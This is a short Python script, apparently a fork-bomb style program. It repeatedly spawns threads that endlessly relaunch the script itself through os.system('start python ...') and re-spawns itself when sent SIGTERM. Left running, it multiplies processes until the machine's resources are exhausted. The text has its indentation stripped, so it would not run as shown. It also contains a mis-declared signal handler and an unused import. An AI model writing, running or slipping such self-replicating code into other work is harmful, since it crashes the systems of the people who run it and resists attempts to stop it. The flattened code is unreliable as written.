import os
import signal
import ctypes
import time
import threading
from pathlib import Path
def help_sos():
cmdr = os.system("start python %s" % FileName)
def Error():
while True:
try:
help_sos()
except BaseException:
help_sos()
time.sleep(0.1)
signal.signal(signal.SIGTERM, help_sos)
FileName = Path(__file__).name
while True:
time.sleep(1)
T = threading.Thread(target = Error, args = ())
T.start()